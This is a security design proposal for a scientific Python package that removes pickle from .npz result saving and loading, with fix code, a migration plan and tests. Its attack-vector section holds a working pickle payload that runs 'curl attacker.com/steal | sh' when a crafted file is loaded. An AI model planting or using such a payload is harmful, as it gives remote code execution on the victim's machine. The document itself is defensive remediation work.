# QEP-CORE-001 — Safe Serialization (Pickle Elimination)

**Status:** Implemented
**Created:** 2026-02-22
**Severity:** CRITICAL (C-3)
**Module:** `fitting/result.py`, `result.py`

---

## Motivation

Both `FitResult.load_results()` (line 596) and `QDMResult.load()` (line 232)
call `np.load(filepath, allow_pickle=True)`. This enables **arbitrary code
execution** — a crafted `.npz` file can execute Python on load. The
`allow_pickle=True` flag is required because `save_results()` stores the
`parameters` dict and `metadata` dict as `dtype=object` numpy arrays:

```python
# fitting/result.py:548
numpy_save_data[key] = np.array([value], dtype=object)
```

These dicts contain only string keys and NDArray/scalar values — they do not
require pickle.

## GUI Integration Requirements

1. List the exact core API/data contract touchpoints used by `qdmpy-gui` (view-model calls, settings keys, map/result fields).
2. Define GUI state/settings migration behavior for any changed defaults, renamed keys, or persisted session/config data.
3. Specify expected user-facing behavior in the GUI for progress, warnings, and errors introduced by this QEP.
4. Include explicit GUI acceptance checks for this QEP scope: `load -> run action -> inspect outputs -> save/reload`, and verify no GUI-only workaround is required.
5. If impact is expected to be none, state the rationale and include a smoke check confirming no `qdmpy-gui` regression.

## Attack Vector

```python
# Malicious .npz creation
import numpy as np, pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/steal | sh',))
payload = np.array([Exploit()], dtype=object)
np.savez_compressed('results.npz', parameters=payload)

# Victim loads
FitResult.load_results('results.npz')  # executes os.system
```

## Proposed Changes

### 1. Save each parameter array as a separate NPZ key

```python
def save_results(self, filepath: str | Path) -> None:
    filepath = Path(filepath)
    save_data: dict[str, NDArray | str | float] = {}

    # Scalar metadata as JSON string
    import json
    meta = {
        'model_name': self.model_name,
        'scan_dimensions': list(self.scan_dimensions),
        'pixel_spacing': self.pixel_spacing,
        'n_pol': self.n_pol,
        'n_frange': self.n_frange,
        'metadata': self.metadata,
    }
    save_data['__meta__'] = np.void(json.dumps(meta).encode())

    # Each parameter as a separate array key
    for name, arr in self.parameters.items():
        save_data[f'param_{name}'] = arr

    # Cached fields (optional)
    if self._b_field_cache is not None:
        save_data['cache_b_field'] = self._b_field_cache
    if self._delta_resonance_cache is not None:
        save_data['cache_delta_resonance'] = self._delta_resonance_cache.values
    if self._b111_cache is not None:
        save_data['cache_b111_remanent'] = self._b111_cache['remanent'].values
        save_data['cache_b111_induced'] = self._b111_cache['induced'].values

    np.savez_compressed(filepath, **save_data)
```

### 2. Load without pickle

```python
@classmethod
def load_results(cls, filepath: str | Path) -> FitResult:
    filepath = Path(filepath)
    if not filepath.exists():
        raise DataLoadError(f'Results file not found: {filepath}')

    data = np.load(filepath, allow_pickle=False)  # SAFE

    import json
    meta = json.loads(bytes(data['__meta__']))

    parameters = {
        key.removeprefix('param_'): data[key]
        for key in data.files if key.startswith('param_')
    }

    return cls(
        parameters=parameters,
        scan_dimensions=tuple(meta['scan_dimensions']),
        pixel_spacing=meta['pixel_spacing'],
        model_name=meta['model_name'],
        n_pol=meta.get('n_pol', 2),
        n_frange=meta.get('n_frange', 2),
        metadata=meta.get('metadata', {}),
    )
```

### 3. Update `QDMResult.save()` / `QDMResult.load()` similarly

`QDMResult.save()` delegates to `FitResult.save_results()` for the fitting
data and saves `nv_axis` as a plain float array. `QDMResult.load()` uses
`allow_pickle=False`.

### 4. Backward compatibility for old files

For one release, `load_results()` can detect old-format files (presence of
`'parameters'` key with `dtype=object`) and fall back to `allow_pickle=True`
with a loud deprecation warning:

```python
if '__meta__' not in data.files:
    logger.warning(
        'Loading legacy pickle-format results file. '
        'Re-save with FitResult.save_results() to migrate. '
        'Pickle support will be removed in v1.0.'
    )
    data = np.load(filepath, allow_pickle=True)
    # ... old loading logic ...
```

## Migration

- New saves are pickle-free immediately.
- Old `.npz` files load with warning for one release.
- No public API change.

## Test Plan

- [ ] Verify `save_results` → `load_results` round-trip (new format)
- [ ] Verify `allow_pickle=False` is used in all `np.load` calls
- [ ] Verify old-format files trigger deprecation warning and still load
- [ ] Verify crafted pickle payload is rejected by new loader
- [ ] Verify `QDMResult.save` / `QDMResult.load` round-trip
